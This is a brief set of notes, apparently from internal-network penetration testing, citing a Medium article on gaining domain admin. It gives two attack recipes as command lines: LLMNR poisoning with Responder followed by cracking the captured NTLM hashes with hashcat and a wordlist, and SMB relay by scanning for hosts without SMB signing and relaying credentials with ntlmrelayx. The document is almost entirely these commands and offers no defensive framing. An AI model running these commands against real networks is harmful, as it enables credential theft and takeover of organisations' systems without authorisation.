https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa
1. LLMNR Poisoning
```
sudo ./Responder.py -I eth0 -rdwv
hashcat -m 5600 ntlmhash.txt ../../rockyou.txt/rockyou.txt --force
```

2. SMB relay
```
nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24
sudo ./Responder.py -I eth0 -rdwv
sudo ntlmrelayx.py -tf targets.txt -smb2support -i
```
